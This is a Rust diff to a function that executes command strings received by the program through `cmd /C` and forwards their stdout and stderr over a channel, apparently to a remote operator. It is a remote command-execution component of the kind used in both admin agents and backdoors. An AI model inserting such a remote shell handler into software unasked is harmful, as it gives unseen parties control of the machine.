@@ -391,30 +391,51 @@ async fn handle_command_payload(string_payload: String, tx: Sender<Vec<u8>>)
 async fn handle_windows_cmd(command_payload: String, tx: Sender<Vec<u8>>)
     -> anyhow::Result<(), anyhow::Error> 
 {
-    let process = Command::new("cmd")
+    use tokio::time::Instant;
+
+    let start = Instant::now();
+    info!("Executing command: {}", command_payload);
+    let mut process = Command::new("cmd")
         .arg("/C")
-        .raw_arg(command_payload)
+        .arg(&command_payload)
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
-        .spawn();
-    
-    match process{
-        Ok(child) => {
-            let output = child.wait_with_output().await?;
-            
-            // client.emit(
-            //     "clientCmdResponse", 
-            //     json!({"message": String::from_utf8(output.stdout)?})
-            // ).await?;
-        },
-        Err(err) =>{
-            info!("Error in process => {err:?}");
-        },
-    };
+        .stderr(Stdio::piped())
+        .spawn()?;
+
+    // Handle stdout and stderr
+    let mut stdout = process.stdout.take().expect("Failed to open stdout");
+    let mut stderr = process.stderr.take().expect("Failed to open stderr");
+
+    let tx_clone = tx.clone();
+    tokio::spawn(async move {
+        let mut stdout_buf = Vec::new();
+        stdout.read_to_end(&mut stdout_buf).await.ok();
+        info!(
+            "{:?}", stdout_buf
+        );
+        tx_clone.send(stdout_buf).ok();
+    });
+
+    let tx_clone = tx.clone();
+    tokio::spawn(async move {
+        let mut stderr_buf = Vec::new();
+        stderr.read_to_end(&mut stderr_buf).await.ok();
+        tx_clone.send(stderr_buf).ok();
+    });
+
+    let output = process.wait_with_output().await?;
+    let duration = start.elapsed();
+    info!("Command executed in {:?}", duration);
+    let tx_clone = tx.clone();
+    if !output.status.success() {
+        tx_clone.send(output.stderr).ok();
+    }
 
     Ok(())
 }
 
+#[cfg(target_os="linux")]
 async fn handle_linux_cmd(command_payload: String, tx: Sender<Vec<u8>>)
     -> anyhow::Result<(), anyhow::Error> 
 {
